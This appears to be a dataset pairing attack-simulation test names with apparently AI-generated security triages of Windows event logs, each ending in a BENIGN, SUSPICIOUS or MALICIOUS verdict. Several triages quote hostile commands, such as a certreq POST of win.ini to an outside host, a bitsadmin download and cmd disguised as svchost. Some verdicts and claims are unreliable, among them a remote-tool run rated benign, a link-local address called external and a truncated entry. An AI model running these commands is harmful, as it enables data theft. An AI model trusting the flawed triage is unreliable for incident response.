The logs contain activities that are potentially legitimate, but aspects like the automated download and execution of software via PowerShell and the use of extensive privileges require further investigation. This task entails confirming the legitimacy of the installations, ensuring no unauthorized scripts executed these commands, and understanding why such high-level privileges were deployed during these operations.

### Guidance on How to Proceed
1. **Investigate the Source**: Verify if the downloading and installation processes of GoToAssist were initiated by legitimate activities, such as an IT support task or part of a scheduled software rollout.
2. **Confirm Permissions**: Review administrative privileges associated with `admin_test` to ensure they are consistent with job responsibilities.
3. **Network Activity Review**: Examine network traffic for unusual patterns, especially focusing on external connections established during the PowerShell executions.
4. **User Activity Verification**: Authenticate the actions of the users involved, particularly concerning the initiation of the PowerShell scripts and subsequent executions.
5. **Additional Monitoring**: Increase logging and monitoring around these accounts and processes to detect any further abnormal behavior."
Ammyy Admin Software Execution,"**Analysis of Logs:**

1. **Process Execution with PowerShell:**
   - Multiple Sysmon events indicate the execution of PowerShell with a command to start a suspicious executable `ammyy.exe`, located in a temporary directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\ammyy.exe`.
   - The use of PowerShell for executing binaries from a temporary directory is suspicious. The `ammyy.exe` file path particularly stands out, as it suggests a remote administration tool (RAT), often used for unauthorized remote access.

2. **Event Log Manipulation:**
   - During the timeframe of interest, processes like `wevtutil.exe` and `conhost.exe` were executed repeatedly. `wevtutil.exe` is used for accessing Windows Event Logs and could be leveraged by an attacker for clearing evidence of an intrusion.

3. **EdgeUpdate Activity:**
   - A lot of activity around Microsoft Edge Update processes is seen, which is typical for legitimate software updates. However, given the suspicious PowerShell activity, this should be validated for possible malicious use to ensure the processes aren't masquerading as legitimate update processes.

4. **Indicators of Malicious Behavior:**
   - Concerning commands executed through PowerShell.
   - Unusual use of legitimate utilities (`wevtutil.exe`, `conhost.exe`) potentially to cover tracks.
   - Execution of `ammyy.exe`, commonly associated with remote control software, increasing the risk of unauthorized access.

5. **Lack of Event Information:**
   - Security and System logs did not supply relevant data, limiting insight into potential privilege escalation or failures that might further indicate malicious activity.

**Assessment:**

Based on the evidence from the event logs, there is a strong indication of suspicious and likely malicious activity. The execution of PowerShell to run `ammyy.exe`, a known remote access tool, in conjunction with the potential tampering of event logs, aligns with tactics often used in cyber intrusions.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Isolation:**
   - Isolate the affected host from the network to prevent further compromise or data exfiltration.

2. **Detailed Forensic Analysis:**

5. **User Awareness and Training:**
   - Communicate with end-users about the potential threat and reinforce best practices in cybersecurity hygiene and awareness."
UltraViewer - RAT Execution,"Based on the analysis of the provided Windows event logs, several suspicious activities can be observed that suggest potentially malicious behavior:

1. **Execution of Unrecognized Software:**
   - The logs show multiple instances of a PowerShell script executing what seems to be unrecognized or non-standard software, specifically `data_UltraViewer.exe` located in a temporary directory. Using PowerShell to execute software from a temporary directory is uncommon for typical operations and can be a tactic employed by an attacker to execute malicious code.
   - The use of `Start-Process` to execute `UltraViewer_Desktop.exe` immediately following the execution of the PowerShell script further adds to the suspicion.

2. **Persistence Mechanism via Service Installation:**
   - A service named ""UltraViewer Service"" is installed and registered with `auto start`, allowing it to persist across reboots. The service runs as the `LocalSystem` account, which gives it high privileges on the system. The logs hint at this with the service registration logs and system-level execution.
   - Continuous registration attempts of .NET assemblies (`RegAsm.exe`) related to `UltraViewer` suggest that the software is attempting to integrate deeply with the system environment, which further indicates possible persistence and deep-seated control over the host.

3. **Use of `taskkill`:**
   - The frequent execution of `taskkill.exe` to terminate processes like `UltraViewer_Desktop.exe` and `UltraViewer_Service.exe`, done repeatedly within short intervals, can indicate attempts to hide or ensure the execution of specific processes without interference from others. This behavior is not typical of legitimate software.

4. **Network Activity Concerns:**
   - While not directly illustrated in these logs, the use of `UltraViewer` software, which is known for remote access functionalities, in conjunction with PowerShell execution and service installation, could imply unauthorized remote access or data exfiltration attempts.

5. **Security Log Entries:**
   - Although the security logs show various logon and privilege events, the significant elements are the admin_test account's use and elevated privileges, which might imply this account was employed for unauthorized activities.

Given these observations, the behaviors exhibited by the scripts, installed services, and executed binaries in conjunction with the use of PowerShell and elevated privileges heavily lean towards malicious intent.

**Assessment:**
This analysis strongly suggests that a potentially unauthorized remote access tool (RAT) has been deployed on the system under the guise of `UltraViewer`, using PowerShell for execution and persistence mechanisms via Windows services.

**Resolution:**
- **MALICIOUS** - The logs indicate activities that are characteristic of a compromise, likely aiming to achieve persistent, unauthorized access and potential exfiltration of data.

**Guidance on How to Proceed:**
1. **Immediate Isolation:**
   - Isolate the affected host from the network to prevent any further potential unauthorized access or data transmission.
   
2. **Conduct a Detailed Forensic Investigation:**
   - Perform a thorough forensic analysis of the machine to understand the full scope of the breach and any additional software or files that may have been installed clandestinely.
   
3. **Remove Unauthorized Software:**
   - Uninstall the `UltraViewer` software and associated services unless confirmed legitimate.
   
4. **Review and Tighten Security Policies:**
   - Implement stricter execution policies for PowerShell and other scripting engines. Consider using application whitelisting to prevent unauthorized software execution.
   
5. **User Awareness and Training:**
   - Increase user awareness about phishing and unsolicited software execution risks, emphasizing vigilance towards alerts and potential security incidents.
   
6. **Monitor Other Systems:**
   - Investigate other systems for similar compromise indicators, particularly for artifacts related to the PowerShell command line used here. 

7. **Patch and Update:**
   - Ensure that all systems are patched and updated, closing any vulnerabilities that may have been exploited."
RemotePC Software Execution,"### Detailed Log Analysis

**Anomalies and Suspicious Activities:**

1. **PowerShell Activity:**
   - Multiple PowerShell events indicate the execution of a process (`RemotePC.exe`) from a temporary directory using PowerShell. The path is obscured using a short path notation (e.g., `ADMIN_~1`), which can be a technique used by malicious actors to obfuscate true paths and evade detection.
   - The process execution from within `AppData\Local\Temp` directory is particularly suspicious, as this directory is commonly used by malware for staging before execution.

2. **Potential Remote Access Tool Installation:**
   - The logs repeatedly reference `RemotePC.exe`, which is a known remote desktop and administrative tool. While it is a legitimate tool, its installation method via PowerShell from a temporary directory raises red flags about potential unauthorized or stealth deployment.
   - Sysmon logs show various child processes spawned by `RemotePC.exe`, impacting multiple system functions and installing components, indicative of potentially setting up persistence mechanisms.

3. **Service Creation and Execution:**
   - An unauthorized service (`RPCService`) has been created, linked with `RemotePCService.exe`, set for automatic startup. This aligns with tactics frequently seen in malware for persistence.
   - The execution of several `msiexec.exe` processes suggests installation or uninstallation activity, which could either be normal software installation processes or result from software attempting to maintain persistence or delete traces.

4. **User Account Privilege Escalation:**
   - The Security log shows numerous privileged operations attempted under the 'SYSTEM' account with high-level privileges (e.g., `SeDebugPrivilege`, `SeImpersonatePrivilege`) and repeated login events for SYSTEM user (`0x3E7`). These activities could be symptomatic of privilege escalation or unauthorized operations performed by malicious software.

5. **Frequent Use of cmd.exe and Task Management Utilities:**
   - The `cmd.exe` was used to create services and operate on core system services (`sc.exe`). Its usage in conjunction with administrative commands without clear legitimate operational justification can be risky.
   - `taskkill.exe` utility, usually used to terminate processes, was also noted to have been executed from the temporary directory context, which might imply tampering or attempts to disrupt system monitoring tools.


### Assessment of the Situation

Based on the logs, the use of PowerShell to run executables from a non-standard, temporary directory suggests dubious actions. The creation of `RPCService` as an auto-starting service correlates to potential unauthorized software persistence mechanisms, likely deployed without proper authorization or aligned business processes. The presence of both legitimate software components and processes typically leveraged for malicious purposes further stresses suspicious activities.

### Threats and Risks Identified
- **System Compromise Risk:** The installation and potentially unauthorized usage of remote management software (`RemotePC.exe`) could lead to unauthorized remote access.
- **Data Exfiltration/Exposure Risk:** Such tools could facilitate external access to sensitive data or allow internal traffic routing outward improperly.
- **Persistence and Further Infection:** Auto-start services and script-initiated application deployments suggest efforts for securing persistence and potentially spreading to other parts of the network.

### Guidance and Recommendations
1. **Immediate Endpoint Quarantine:** The compromised host should be isolated to prevent potential lateral movement or data exfiltration.
2. **In-Depth Analysis:** Conduct a more thorough forensic investigation to understand the breach scope and determine if additional systems or data were affected.
3. **User Awareness and Training:** Reinforce user security training, specifically highlighting the risks from unauthorized software execution and remote access tools.
4. **Review and Harden PowerShell Execution Policies:** Implement stricter logging, monitoring, and execution policies on scripting tools, particularly PowerShell.
5. **Patch Management and System Hardening:** Ensure systems are up-to-date with the latest security patches and review system configurations to limit unauthorized activities.

**Resolution:** **MALICIOUS**

The logs contain multiple signs of suspicious and potentially malicious activities indicative of system compromise, necessitating immediate remediation steps."
Testing usage of uncommonly used port with PowerShell,"Upon reviewing the provided Windows event logs, here's the detailed analysis:

### Analysis:

1. **Security Log Analysis:**
   - Events 4624 and 4672 show successful logon for the ""SYSTEM"" account. These logons are associated with privilege assignments including high-level privileges like `SeDebugPrivilege`. Although this is common for services running as SYSTEM, constant privilege assignment, if unexplained, could be a potential indicator. However, such events are expected on a server system.
   - Event IDs 4798 present queries related to security principals, likely part of standard administrative tasks.
   - Event ID 5379 indicates credential validation operations failing with a particular return code, `3221226021`, commonly related to invalid credentials or inaccessible resources, but matches normal occurrences when services like Microsoft Account try to access from local servers.

2. **Application Log Analysis:**
   - The logs here are routine system actions, such as edge services starting/stopping, and Windows Defender state reporting. Nothing immediately indicative of malicious behavior.

3. **Windows PowerShell Log Analysis:**
   - Log entries from PowerShell indicate a `Test-NetConnection` command to `google.com` on port 8081. This can suggest a connectivity check. If not intentional and not logged by user action, this should raise an eyebrow for further review as it might imply reconnaissance.

4. **Sysmon Log Analysis:**
   - Numerous entries indicating the normal behavior of various system processes and Windows services, including those related to Windows Update and Edge updates which are constantly being installed and interacted with on a live system.
   - Execution of `wevtutil.exe` by `admin_test` can be legitimate for querying event logs, yet multiple executions close together might need correlation with known administrative tasks.
   - Additionally, normal `rundll32.exe` and `compatTelRunner.exe` activity related to system operations and telemetry data collection processes are noted.

### Conclusion:

- There is **no definitive indicator of malicious activity** within these logs. Event logs showcase general system operations, Windows updates, and routine maintenance processes that would naturally occur on a Windows server.
- However, one should verify the `PowerShell` command's origin and purpose to rule out unintended network scanning or probing which might be unsuspectingly allowed via scripts.

### Resolution:
**SUSPICIOUS** - While most activities can be considered standard, the PowerShell activity's intent must be thoroughly established to move towards a benign conclusion. Further investigation is recommended on potentially unauthorized or unexplained commands/scripts being executed, especially if this PowerShell activity was unsanctioned or not logged as a typical admin task."
UltraVNC Execution,"Based on the detailed examination of the provided Windows event logs, several observations suggest potential suspicious or malicious activities that warrant further investigation.

### Analysis:

1. **PowerShell Usage**:
   - Log Entry: Sysmon Event ID 1 indicates the execution of `powershell.exe` with a command to start `vncviewer.exe`. PowerShell execution, especially invoking executables, can often be exploited for malicious purposes.
   - The command line involves starting a process that involves a VNC viewer, which is a remote access tool. This could indicate potential remote desktop access being initiated without approval.

2. **Installation and Usage of UltraVNC**:
   - Multiple events show the execution of UltraVNC components (`setpasswd.exe`, `setcad.exe`, `vncsetup.tmp`). 
   - The use of VNC tools within the network can be concerning if not explicitly authorized, as they can allow remote control of the system. 
   - The installation and invocation of VNC-related tools with high integrity levels indicate that there was an attempt to set up remote control or access without typical oversight, potentially for remote administration without security checks in place.

3. **Netsh Commands**:
   - There are multiple instances of `netsh.exe` being used to modify firewall rules, specifically opening ports 5800 and 5900, which are commonly used for VNC.
   - Unauthorized modification of firewall rules implies a significant security risk as it can expose the network or system to external threats.

4. **Command Line and Execution Trace**:
   - Entries indicate silent installation commands, which can often be characteristic of malicious installation where the attacker is trying to avoid detection.
   - The presence of ""silent"" in the command line further suggests an attempt to deploy software without user intervention or notification.

5. **User Account Context**:
   - Most actions are performed under the user `SERVER002\\admin_test`, which implies privileged access. The actions of creating new processes and modifying firewall settings should be scrutinized, especially if the admin_test account activity is anomalous against its typical usage pattern.

### Conclusion and Resolution:

The analysis of the logs indicates unusual and potentially unauthorized activity, which poses a security risk. The combination of PowerShell scripts to invoke external processes, unauthorized firewall rule adjustments, and the installation and use of remote access tools like UltraVNC necessitates further investigation.

**Resolution: SUSPICIOUS**.

### Guidance on How to Proceed:

1. **Immediate Action**:
   - Isolate the machine from the network to prevent potential lateral movement or external control until further investigation is done.
   - Review user activity logs for `SERVER002\\admin_test` and determine if the account is compromised.

2. **Investigation**:
   - Conduct a comprehensive audit of changes to the firewall rules and check if similar changes have been made on other systems.
   - Verify the legitimacy of the UltraVNC installation and determine whether it was an authorized install.

3. **Further Monitoring and Mitigation**:
   - Implement monitoring for unusual PowerShell activity across the network.
   - Assess all systems for unauthorized tools and ensure that all remote access tools are logged and verified as necessary.

4. **User Training and Policy Review**:
   - Review and enforce policies around the use of administrative accounts and remote access tools.
   - Conduct security awareness training, particularly aimed at recognizing and preventing security incidents."
Psiphon,"Upon analyzing the provided Windows event logs, several key activities stand out that require scrutiny:

1. **PowerShell Execution**: 
   - There are multiple instances of PowerShell being launched, notably with command lines pointing to a script located in a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\src\script.bat`). This usage of PowerShell is especially suspicious given its execution context from a temporary directory, which is a common tactic used in malicious activities to execute unauthorized scripts.

2. **Suspicious Cmd.exe and Batch File Execution**:
   - The `cmd.exe` was invoked to run the same batch file script noted above. The use of batch files in temporary directories can indicate malware or suspicious activity, especially if they are automatically executed without documented legitimate business processes or user intent.
   
3. **Process and User Anomalies**:
   - Multiple processes like `wevtutil.exe`, `whoami.exe`, and PowerShell being executed under the `SERVER002\admin_test` account. The execution of `whoami.exe` is often used in scripts or by attackers to confirm access rights. 
   - `wevtutil.exe` is used for event log management which may indicate attempts to cover tracks by modifying event logs.

4. **Credential Access and Logon Events**:
   - Numerous credential-related events (Event ID 5379) around accessing Microsoft accounts and requesting credentials returning `3221226021` as the return code, indicating an access denial or error in the credential operations. Frequent attempts and failures may imply unauthorized access attempts or components misconfiguration.

5. **Multiplicity of Executables**:
   - Numerous Microsoft Edge installer executions and update processes occurred (`MicrosoftEdge_X64_130.0.2849.46_129.0.2792.89.exe`), but the context around these installations appears automated and potentially initiated by a third party, making their legitimacy questionable if not verified as recent updates configured by IT.

6. **Logon and Privilege Escalation Events**:
   - Regular `4624` logon and `4672` privilege escalation events using `SYSTEM` credentials and a notable logon from `fe80::e3b5:5371:12a8:9c77` which is from a link-local IPv6 address suggesting a network-based operation which should be further confirmed against the known network setup.

### Assessment:
Given the combination of manual and automatic processes running from known suspicious paths in conjunction with the utilization of built-in Windows utilities to potentially manipulate logs and execute batch files, this system has indications of potential compromise or unauthorized activity.

### Resolution:
- **SUSPICIOUS**: The logs contain activity that doesn't look right and needs more investigation. Immediate steps should include:
  - Isolating the machine from the network to prevent potential spread.
  - Conducting a deeper forensic analysis of the scripts and files executed from the temporary directories, focusing on their footprint and origin.
  - Reviewing recent user activities and installed applications for legitimacy and scanning the system with updated antivirus tools.
  - If no legitimate business processes or IT-mandated updates explain the PowerShell usage and Edge installations, treat them as potential attack indicators and further involve incident response teams for cleanup and containment."
svchost writing a file to a UNC path,"### Detailed Analysis of the Logs

**1. Summary of Findings:**
The provided logs highlight a pattern of potentially suspicious activity involving process executions, possibly indicating malicious behavior. Notably, there are indications of potential Host intrusion or compromised credentials based on several key aspects of the behavior observed, such as unusual process names, suspicious command lines, and questionable parent-child process relationships.

**2. Suspicious or Anomalous Behaviors:**

- **Process Execution:**
  - Multiple instances of `cmd.exe` are running with a command line that attempts to copy `cmd.exe` to `C:\svchost.exe` and execute it with parameters to create files on the local machine.
  - `cmd.exe` executed with `/c copy C:\Windows\System32\cmd.exe C:\svchost.exe` is a clear indicator of malicious activity as it aims to disguise a copy of cmd as svchost, which is a common Windows process.

- **Command-Line Arguments:**
  - The command line `/c copy C:\Windows\System32\cmd.exe C:\svchost.exe & C:\svchost.exe /c echo data > \\localhost\c$\data.txt` is highly suspicious. It involves copying system binaries, executing them in unconventional manners, and using them to write data, a behavior typical of malicious scripts.

- **Privilege Escalation:**
  - The user `admin_test` is shown to be engaging in activities that typically require elevated privileges, like copying commands and interacting with system processes.
  - EventID `4672` indicates that the user `admin_test` was granted a breadth of privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which are often leveraged in attacks for privilege escalation or lateral movement.

- **Process Chains:**
  - Processes such as `wevtutil.exe` and `conhost.exe` are seen executing in tandem with shared user accounts, but without typical command-line arguments expected of legitimate system operations. Each of these audit processesâ€™ appearances in close succession under a privileged user without clear operational context elevates concern.

- **File Path and Process Name Anomalies:**
  - `C:\svchost.exe`: Placing executable files/naming them to mimic critical system processes (like svchost.exe) is a common attacker strategy for persistence or evasion.

**3. Direct Indicators of Malicious Activity:**

- The renaming of `cmd.exe` to `svchost.exe` and subsequent execution represents an evasion technique used by attackers to bypass security monitoring and run malicious commands with a benign appearance.

- Attempts to write to hidden network shares (`\\localhost\c$\data.txt`) could imply data exfiltration or unauthorized data handling.

**4. Assessment of the Situation:**

- **Threats/Risks Identified:**
  - Potential threats include system compromise through credential misuse, unauthorized access with high privileges, unauthorized modifications of system files, and potential data exfiltration or malicious payload execution.

- **Guidance on How to Proceed:**
  - Immediate remediation steps should include isolating the affected system for further forensic analysis to prevent any potential spread or escalation.
  - Initiate a password reset for the `admin_test` account and any associated accounts to disrupt potential attacker persistence.
  - Further investigation into network logs to identify any potential data exfiltration or lateral movement.
  - Comprehensive review of the host's integrity, with antivirus/malware scans and integrity checks on Windows system files.

### Resolution:
**MALICIOUS** - The event logs provide substantial evidence of malicious activity, including suspicious use of Windows commands and processes in ways consistent with security evasion and potential data exfiltration attempts. Immediate containment and remediation are necessary."
Download a File with Windows Defender MpCmdRun.exe,"### Detailed Analysis of the Provided Windows Event Logs

#### Observations:

1. **Time Manipulation**:
   - The logs indicate several time change events via `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service`, adjusting the system clock backward by approximately 2 seconds (`EventID 4616` and `EventID 1`). These changes were executed by `svchost.exe`, a legitimate Windows process. Time adjustments can be benign, especially if related to time synchronization, but repeated or unexpected adjustments can be suspicious in certain contexts.

2. **Process Execution and Privileges**:
   - The Sysmon logs (`EventID 1`) reveal the execution of processes such as `cmd.exe` and `MpCmdRun.exe`, which seem to be related to Microsoft Defender operations, based on their command lines. However, `cmd.exe` is executed by `wsmprovhost.exe` under an `admin_test` user, which could be expected if administrative tasks or automated scripts are being run.
   - Events indicate `whoami.exe` and `hostname.exe` executions. These commands are used for information gathering on the system. While they can be part of routine administration, unexpected or unexplained usage, particularly on a high-profile machine like the CEO's, should be reviewed.

3. **Privilege Escalation Attempts**:
   - Event 4672 indicates special privileges assigned to the SYSTEM user, which is expected but should be monitored to ensure no abuse.
   - The repeated use of Microsoft Edge Update processes may align with legitimate update activities given their context and command line arguments, but their frequency and consistent high integrity level merit further investigation.

4. **Use of `wevtutil.exe`**:
   - Multiple uses of `wevtutil.exe`, seen in Sysmon logs, are intriguing because this utility is often used to export, archive, or clear event logs. It was executed by the `admin_test` user. If there is no known, legitimate reason for this usage, it could indicate an attempt to cover tracks or exfiltrate log data, thus marking it as suspicious.

5. **Microsoft Edge Update Activity**:
   - A significant number of processes related to Microsoft Edge Update were executed. The majority of these activities appear to conform to standard update and installation behavior, including service launch and registration processes. They are consistent with a legitimate software update.

6. **Logons and Authentication**:
   - There were standard system logons indicated by `EventID 4624` and successful privilege assignments shown in `EventID 4672`. These are not inherently suspicious without additional context suggesting misuse.

#### Assessment:
- **Overall Assessment**: The logs present a mixed scenario where much activity appears benign or aligned with legitimate system and software update functions but exhibits some behaviors characteristic of suspicious activity, such as the use of `wevtutil.exe` by a non-standard user account and unusual time changes.
- **Resolution**: **SUSPICIOUS**. The activities logged, especially the repeated time changes, usage of potentially sensitive commands, and use of `wevtutil.exe` without contextual information, warrant further investigation to rule out malicious intent. These elements could indicate an attempt at covering tracks or unauthorized information gathering.

#### Recommended Actions:
1. **Further Investigation**:
   - Verify the necessity and legitimacy of the time changes and the `wevtutil.exe` executions.
   - Review `admin_test` user activity around these times to confirm whether these operations were expected and authorized.
   - Analyze if `MpCmdRun.exe` execution was part of a scheduled scan or task.
2. **Mitigation and Monitoring**:
   - Strengthen monitoring on `wevtutil.exe` and privileged command-line tool usages.
   - Implement or review alerts for similar suspicious activities, focusing on time changes and command executions by non-standard users.
   - Ensure all security patches and updates are correctly applied and that EDR and antivirus solutions such as Windows Defender are fully operational.

3. **Engage with User**:
   - If necessary, engage with the CEO or relevant personnel to understand their interaction with the system that might have prompted these logs, ensuring that activities are understood and accounted for."
DNS over HTTPS Regular Beaconing,"### Detailed Analysis:

The provided logs were examined to identify any indicators of malicious activity. Here's a breakdown of the key points from various log files:

#### Application Log:
- The application log entry from ""Microsoft-Windows-Security-SPP"" is benign and indicates activity from the Software Protection Platform Service, which is typically related to Windows licensing and activation processes.

#### Sysmon Log:
- Multiple instances of `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\admin_test` are observed without any accompanying suspicious command-line arguments. Both `wevtutil.exe` and `conhost.exe` are legitimate Windows processes, though `wevtutil.exe` could be used for exporting event logs.
- A command sequence involving `powershell.exe` executing a script `data-doh-beacon.ps1` is noted with certain arguments that appear to facilitate connections to a specified DNS server (https://8.8.8.8/resolve) using `QueryType TXT`. The script indicates communication with a domain `127.0.0.1.xip.io`, which is non-standard behavior and could be indicative of data exfiltration or C2 activity.
- Given that PowerShell is often used by attackers for execution of malicious scripts without writing them to disk due to its scripting capabilities, this activity is considered suspicious.

#### Security Log:
- Event IDs 4624 and 4672 show successful logons with elevated privileges under the account `admin_test`, indicating that this account possesses a range of privileges including `SeDebugPrivilege`, which is indicative of a powerful account typically necessary for system-level tasks.
- The logon type (3) suggests a network logon, and the use of NTLM authentication might be typical, but it's important when combined with the PowerShell activity.

#### Windows PowerShell Log:
- This log corroborates the execution of the script `data-doh-beacon.ps1` by `powershell.exe` with similar command line arguments as seen in the Sysmon log. The utilization of the provided URL and parameters further affirms the suspicious nature of this script execution.

#### System Log:
- The time change events indicate a normal action where the system time was synchronized with an NTP server (`time.windows.com`), which is typical behavior.

### Assessment:

- **Suspicious Activity Identified**: 
  - The PowerShell execution of the `data-doh-beacon.ps1` script with arguments that suggest DNS tunneling activities is highly suspicious. This behavior aligns with tactics often used for stealthy communication by adversaries.
  - Elevated privileges associated with the `admin_test` account present a potential risk, especially considering simultaneous suspicious PowerShell use.

### Resolution:

- **Resolution**: **SUSPICIOUS**

### Guidance:

1. **Containment Actions**:
   - Isolate the system (`Server002`) from the network to prevent potential data exfiltration or communication with any command and control (C2) infrastructure.

2. **Further Investigation**:
   - Conduct a deeper forensic analysis on the suspicious script (`data-doh-beacon.ps1`) and related artifacts to determine the functionality and intent.
   - Review the actions performed by the `admin_test` account, including any lateral movement or privilege escalation attempts from other machines.

3. **Credential Safety**:
   - Consider resetting passwords for the `admin_test` account to prevent unauthorized access if credence theft has occurred.
   - Audit all privileged accounts for unusual activity during the same time frame.

4. **Threat Hunt**:
   - Search for similar patterns of behavior across other machines within the network to identify any widespread presence of suspicious scripts or command executions.

5. **Implementation of Monitoring**:
   - Enhance monitoring capabilities, especially around the use of PowerShell, and implement stricter execution policies where applicable to prevent unauthorized script execution. 

Ultimately, based on the analysis, the activity requires further scrutiny to determine if a genuine threat actor is present and actively leveraging the suspicious PowerShell scripts against the organizationâ€™s network."
certreq download,"### Analysis of Windows Event Logs

#### Suspicious or Anomalous Behaviors

1. **Repeated Invocation of wevtutil.exe**:
   - `wevtutil.exe` is primarily used for managing event logs on Windows. It's generally not something that would frequently appear in logs under normal operations.
   - The consistent pairing with `conhost.exe` is peculiar, especially since both are being executed by the `SERVER002\admin_test` user, suggesting potential manipulation or tampering with event logs.

2. **Use of CertReq.exe**:
   - A suspicious command was detected with `cmd.exe` executing `certreq.exe` through the following command: 
     ```
     certreq.exe -Post -config https://example.com c:\windows\win.ini %temp%\file-license.txt
     ```
   - The usage of `certreq.exe` with HTTP communications to an external server (https://example.com) is highly suspicious and indicative of possible data exfiltration or secure communications attempts.

3. **Unusual Network Connections**:
   - Logon events (ID 4624) depict network logon events (LogonType 3) coming from external network addresses that include IPv6 addresses like `fe80::e3b5:5371:12a8:9c77`. This could indicate external or unauthorized attempts to access the system.

4. **Privilege Escalation Indicators**:
   - Multiple instances of Event ID 4672 indicate that the `admin_test` user acquired privileges typically associated with elevated or administrative rights. The consistency and timing of these privilege escalation attempts may suggest an attempt to gain unauthorized abilities on the host.

5. **Abnormal Use of System Utilities (whoami.exe, HOSTNAME.EXE)**:
   - Executing utilities like `whoami.exe` and `HOSTNAME.EXE` sequentially might indicate enumeration activity by a malicious actor to understand user context and network configurations.

#### Malicious Activity Indicators
- **The combination of several above-highlighted processes**â€”especially the misuse of `certreq.exe` for an external POST request, along with the potential event log tampering using `wevtutil.exe`, and network logins from suspicious sourcesâ€”strongly align with behavior commonly associated with malicious activity, such as a compromised actor trying to cover tracks or exfiltrate data.

### Threat Assessment and Risks
1. **Insecure Data Handling**: The use of `certreq.exe` to an potentially untrusted HTTP endpoint suggests possible data exfiltration attempts.
2. **Log Tampering**: Multiple `wevtutil.exe` activities suggest potential erasure or tampering of evidence within the system logs.
3. **Privilege Abuse**: Elevated privileges observations could indicate attempts at achieving persistence or modifying system configurations stealthily.

### Guidance and Recommendations
- **Immediate Forensic Investigation**: Start a thorough forensic analysis of `SERVER002` to determine what specific data was affected and how entry was originally gained.
- **Network Monitoring**: Review and take action against any suspicious IP traffic, particularly the IPv6 addresses mentioned in logon events.
- **Strengthen Controls**: Immediately strengthen user password policies, and consider implementing multi-factor authentication to mitigate unauthorized access.
- **Review Authorized Access**: Audit the user accounts, especially `admin_test`, to ensure that activity aligns with expected behavior.
- **System Restore or Reinstallation**: Consider restoring the system to a known good backup before the incident date or reinstall to ensure complete mitigation of potential malware or backdoors.

### Final Resolution
- **MALICIOUS**: The logs indicate a high likelihood of malicious activity. Proper incident response and remediation actions should be undertaken promptly."
Windows - BITSAdmin BITS Download,"Upon analyzing the provided Windows logs, several entries stood out which indicate potential indicators of compromise:

1. **Use of `bitsadmin` for File Transfer**:
   - Sysmon Event ID 1 logs indicate the execution of the command:
     ```
     ""cmd.exe"" /c C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/file/file-file/master/LICENSE.txt %%temp%%\file-license.txt
     ```
   - `bitsadmin` is a legitimate Windows command-line tool used for managing BITS jobs. However, attackers have been known to misuse it to download malicious files, especially from ostensibly legitimate URLs.

2. **Multiple Execution of `whoami.exe` and `conhost.exe`**:
   - There are logs for the consistent use of `whoami.exe` and `conhost.exe`. While `whoami.exe` simply retrieves the current user information, its repeated execution, particularly after being initiated by `wsmprovhost.exe`, which is linked to Windows remote management, may suggest an attacker is attempting to enumerate system or user details. 
   - `conhost.exe` instances are normal when running command-line processes, but their number and timing in conjunction with `whoami.exe` warrant further scrutiny.

3. **`wevtutil.exe` Process Executions**:
   - `wevtutil.exe` is a command-line utility for managing the Windows Event Log. Its presence in these logs, particularly if frequent, excessive, or during unexpected times, may illuminate attempts to clear log entries or export logs to obscure evidence.

4. **Edge Update Activity**:
   - There are legitimate EdgeUpdate and EdgeUpdateSetup processes. However, their legitimacy can be influenced by check integrity, verifying the update path, and ensuring hashes correspond to known values.
   
Overall, the use of `bitsadmin` to transfer a file from an unexpected remote source, especially if related to a GitHub URI, is highly suspicious. Furthermore, the repeated invocation of system utilities such as `whoami.exe` and `wevtutil.exe` without a clear business justification raises concerns about potential enumeration or obfuscation actions by a threat actor.

**Situation Assessment**:
Given the observations:
- The presence of a `bitsadmin` command potentially downloading an unknown file.
- Suspicious usage patterns of enumeration and log manipulation utilities.

**Resolution**: **MALICIOUS**

**Recommendations**:
- Isolate the system for further investigation.
- Verify the downloaded file if it exists on the system.
- Conduct a deeper forensic investigation to identify potential persistence mechanisms or additional attacker footholds.
- Review network logs to check any outbound connections initiated by `bitsadmin` or related processes.
- Check for IOCs in threat intelligence platforms for further correlation.
- Ensure appropriate security patches and endpoint detection responses are active.
- Brief team on findings and monitor other systems for similar activities."
MSP360 Connect Execution,"Upon reviewing the provided logs from various Windows event sources, here's a detailed analysis of the activities logged:

### Analysis of Logs:

#### Windows PowerShell Log:
- **Powershell Execution Initiation**: We observe PowerShell being invoked with the command `powershell.exe & {Start-Process $env:ProgramFiles\Connect\Connect.exe}`. This is logged across multiple events, indicating that this action was likely executed in a scripted or automated manner.
- **Lack of Additional Command Details**: The command-line details are minimal, with no specific user input commands or scripts being executed other than the initiation of `Connect.exe`. This could suggest that a benign application is being run, but without more context about ""Connect.exe"", it's challenging to ascertain its legitimacy.

#### Sysmon Log:
- **Multiple Process Creations**: There is extensive logging of various processes such as `WindowsPowerShell`, `conhost.exe`, `whoami.exe`, `HOSTNAME.EXE`, etc. These are normal system processes, but the presence of `wevtutil.exe` and the consistent usage of PowerShell from `C:\Windows\System32` could be reviewed for typical Windows administrative activities.
- **EdgeUpdate Executions**: Numerous events related to `MicrosoftEdgeUpdate.exe` and its components are seen. These processes appear to correspond with automated updates for Microsoft Edge, which is a routine background activity.
- **User Context**: Most process initiations occur under the user `SERVER002\admin_test` or `NT AUTHORITY\SYSTEM`, which is typical for administrative-level operations or system service tasks.

#### Application Log:
- **Software Protection and Edge Updates**: Events reference the Software Protection Platform and repeated ""Service stopped"" entries for `edgeupdate`. These appear consistent with regular application updates and system management tasks.

### Assessment of the Situation:

- **No Definite Malicious Indicators**: The logs indicate a routine, albeit automated, execution of processes that are consistent with system maintenance and user administrative activities.
- **Need for Context on Connect.exe**: The recurring invocation of `powershell.exe` to start `Connect.exe` could be flagged for further verification, especially regarding the legitimacy and intended purpose of ""Connect.exe"".
  
### Resolution:
Given the absence of overtly malicious indicators, unfamiliar external IP addresses, or processes that appear unusual or protections-bypassing, my current assessment of the situation is:

- **Resolution: BENIGN** - The logged activities appear to be part of routine system updates, user administrative commands, or legitimate software operations. However, it is always prudent to maintain vigilance and periodically review the legitimacy and integrity of executable files such as ""Connect.exe"" involved within critical operations. Further action can include verifying ""Connect.exe"" with security software or checking its digital signature for authenticity."
